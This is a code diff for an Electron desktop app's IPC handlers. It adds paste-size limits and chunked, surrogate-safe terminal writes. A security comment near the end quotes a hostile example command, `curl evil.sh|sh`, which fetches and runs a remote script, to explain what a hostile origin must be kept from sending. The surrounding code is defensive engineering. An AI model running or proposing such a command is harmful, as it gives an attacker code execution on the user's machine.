@@ -27,6 +27,7 @@ import {
 } from '@sim/terminal-protocol'
 import { getErrorMessage } from '@sim/utils/errors'
 import { isRecordLike } from '@sim/utils/object'
+import { PASTE_LIMITS, utf8ByteLength } from '@sim/utils/paste'
 import type { BrowserWindow, IpcMainEvent, IpcMainInvokeEvent, WebContents } from 'electron'
 import { clipboard, ipcMain, shell } from 'electron'
 import {
@@ -90,6 +91,23 @@ const logger = createLogger('DesktopIpc')
 
 /** Workspace/chat ids are opaque tokens; anything else never reaches a URL. */
 const ID_PATTERN = /^[A-Za-z0-9_-]{1,128}$/
+const TERMINAL_WRITE_CHUNK_CHARACTERS = 64 * 1024
+
+function writeTerminalText(
+  terminal: TerminalRegistry,
+  scope: string,
+  terminalId: string,
+  text: string
+): void {
+  let start = 0
+  while (start < text.length) {
+    let end = Math.min(start + TERMINAL_WRITE_CHUNK_CHARACTERS, text.length)
+    const finalCode = text.charCodeAt(end - 1)
+    if (end < text.length && finalCode >= 0xd800 && finalCode <= 0xdbff) end -= 1
+    terminal.write(scope, terminalId, text.slice(start, end))
+    start = end
+  }
+}
 
 const MICROPHONE_SETTINGS_URLS: Partial<Record<NodeJS.Platform, string>> = {
   darwin: 'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone',
@@ -1546,7 +1564,10 @@ export function registerIpcHandlers(deps: IpcDeps): void {
         if (!scope || typeof terminalId !== 'string') return false
         const text = clipboard.readText()
         if (!text) return false
-        deps.terminal.write(scope, terminalId, text)
+        if (utf8ByteLength(text, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) {
+          return 'too-large'
+        }
+        writeTerminalText(deps.terminal, scope, terminalId, text)
         return true
       },
     },
@@ -1735,7 +1756,8 @@ export function registerIpcHandlers(deps: IpcDeps): void {
       handler: (sender, terminalId, data, rawScope) => {
         const scope = rendererScope(terminalScopeBySender, sender as WebContents, rawScope)
         if (!scope || typeof terminalId !== 'string' || typeof data !== 'string') return
-        deps.terminal.write(scope, terminalId, data)
+        if (utf8ByteLength(data, PASTE_LIMITS.TERMINAL_BYTES) > PASTE_LIMITS.TERMINAL_BYTES) return
+        writeTerminalText(deps.terminal, scope, terminalId, data)
       },
       // An XSS'd or hostile origin must not reach `write(id, 'curl evil.sh|sh\r')`.
       // Panel focus is deliberately not used — `terminal:focused` is a
